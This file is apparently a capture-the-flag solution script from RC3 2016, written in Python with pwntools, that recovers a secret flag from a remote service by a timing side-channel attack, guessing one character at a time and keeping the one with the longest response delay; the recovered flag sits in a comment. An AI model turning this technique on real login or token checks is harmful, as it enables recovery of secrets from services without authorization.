#!/usr/bin/env python

from pwn import *
from time import time
from collections import defaultdict
from operator import itemgetter

context.log_level = 'error'

ALPHABET = '@-_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'

def brute():
  flag = '' # RC3-2016-itz-alw4yz-a-g00d-t1m1ng-@tt@ck

  while True:
    a = {}
    a = defaultdict(lambda: 0, a)

    for guess in ALPHABET:
      x = remote('goodtime.ctf.rc3.club', '5866')
      x.recvuntil('To have goodtime enter flag: ')

      start = time()
      x.sendline(flag + guess)
      x.recvuntil('\n')
      x.close()
      elapsed = time() - start
      print("%c %f" % (guess, elapsed))

      a[guess] = elapsed

    # extract the character with the longest delay
    sorted_x = sorted(a.items(), key=itemgetter(1))
    flag += sorted_x[-1][0]
    print('flag: %s' % flag)

if __name__ == "__main__":
  brute()
